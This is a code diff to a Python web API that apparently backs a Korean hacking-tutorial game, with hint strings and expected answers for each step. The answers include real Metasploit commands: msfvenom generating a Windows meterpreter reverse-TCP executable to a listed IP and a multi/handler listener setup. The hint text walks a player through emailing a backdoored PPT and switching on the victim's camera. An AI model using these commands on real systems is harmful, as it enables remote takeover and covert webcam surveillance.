@@ -33,7 +33,7 @@ async def main(file_path: str):
 
 @app.get("/api/{type}")
 def api(type: str):
-    resp = {'count':['0','2','2','1','2','6','2','1','1','1','2','3','2','1'],
+    resp = {'count':['0','2','2','1','2','7','2','1','1','1','2','3','2','1'],
     'tip': ['You FOUND Easter EGG!!!\n\nCONGRATUATIONS\n\nhttps://sv.m03.pw/hacknet_ItsEasterEgg.html',
     '우리가 울랄라 대장의 이메일 주소를 알아냈어.\n이 주소로 백도어가 심어진 PPT파일을 보내야 해.\n먼저 PPT파일에 백도어를 심어보자.\n백도어를 만들때에는 Metasploit를 사용합니다.\n먼저, 자신의 IP를 알아내자! 어떻게 해야 할까??\n',
     '백도어를 만들어 보자! METASPLOIT이라는 프로그램은, 백도어가 심어진 파일을 만들 수 있게 해줘. METASPLOIT은 msfvenom라는 명령어로 확인할 수 있습니다! 이제 Metasploit을 사용하는 법을 알아야 겠지? 어떤 명령어의 도움말을 알기 위해서는 "man <명령어>"라는 명령어를 사용해. 기억해 두자! 이제 사용법을 알아볼까? msfvenom 사용법은 "man msfvenom"을 치면 알 수 있겠지?',
@@ -54,7 +54,7 @@ def api(type: str):
     ['도움말을 읽어보고 무엇을 해야 할지 생각해 보자! 근데 페이로드는 뭐고, msfvenom은 뭐지..? "openvideo"로 영상을 보자!','sys:run explorer http://sv.m03.pw/video/p01.mp4'],
     ['이제 바탕화면에 EXE파일이 생성되었겠지?? 이걸 보내보자!'],
     ['이제 msf콘솔을 사용할 수 있어!\n원격제어를 하기위한 방법을 알기전에 영상을 다시 보자. 어떤 명령어를 입력해야 하지?\n','sys:run explorer http://sv.m03.pw/video/p02.mp4'],
-    ['','','','좋아! 이제 그 컴퓨터는 너의 것이야! 이제 우리는 카메라를 켜야겠지? 카메라에서 영상을 가져오는 명령어는 getcam이야. 어떻게 사용하는 걸까?','\n해보자!\n','sys:run explorer http://sv.m03.pw/video/01.mp4'],
+    ['','','','','좋아! 이제 그 컴퓨터는 너의 것이야! 이제 우리는 카메라를 켜야겠지? 카메라에서 영상을 가져오는 명령어는 getcam이야. 어떻게 사용하는 걸까?','\n해보자!\n','sys:run explorer http://sv.m03.pw/video/01.mp4'],
     ['좋아! 전송됐어!! 이제 많은 사람들이 진실을 알게 될거야!!!!!! 뉴스를 한번 볼까?? "openvideo"','sys:run explorer http://sv.m03.pw/video/02.mp4'],
     ['sys:run explorer http://sv.m03.pw/video/p03.mp4'],
     ['sys:run explorer http://self.m03.pw/quiz.html'],
@@ -68,7 +68,7 @@ def api(type: str):
     ['man msfvenom','openvideo'],
     ['msfvenom -p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f exe > back.exe'],
     ['man msfconsole', 'openvideo'],
-    ['msf use exploit/multi/handler set payload windows/meterpreter/reverse_tcp', 'set LHOST=144.168.0.22', 'set LPORT=2031', 'set ExitONsession false','man getcam','get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung'],
+    ['msf use exploit/multi/handler','set payload windows/meterpreter/reverse_tcp', 'set LHOST=144.168.0.22', 'set LPORT=2031', 'set ExitONsession false','man getcam','get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung'],
     ['cellbroad_attack','openvideo'],
     ['openvideo'],
     ['openweb'],
